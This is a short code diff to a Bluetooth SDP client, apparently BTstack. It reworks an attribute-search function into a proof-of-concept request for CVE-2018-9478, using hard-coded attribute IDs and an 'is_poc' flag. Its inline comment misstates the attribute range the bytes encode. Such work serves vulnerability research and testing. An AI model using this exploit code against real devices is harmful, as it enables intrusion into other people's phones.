@@ -1021,16 +1021,16 @@ uint8_t sdp_client_service_search(btstack_packet_handler_t callback,
 
 uint8_t
 sdp_client_service_attribute_search_cve(btstack_packet_handler_t callback,
-                                        bd_addr_t remote,
-                                        uint32_t search_service_record_handle,
-                                        const uint8_t *des_attribute_id_list)
+                                        bd_addr_t remote)
 {
+    uint8_t attributeIDList[] = {0x35, 0x05, 0x0A, 0x00, 0x01, 0xff, 0xff}; // Attribute: 0x0001 - 0x0100
+
     if (!sdp_client_ready())
         return SDP_QUERY_BUSY;
 
     sdp_parser_init(callback);
-    serviceRecordHandle = search_service_record_handle;
-    attribute_id_list = des_attribute_id_list;
+    serviceRecordHandle = SDP_ServiceRecordHandle;
+    attribute_id_list = attributeIDList;
     continuationStateLen = 0;
     PDU_ID = SDP_CVE_2018_9478_Response;
     is_poc = true;
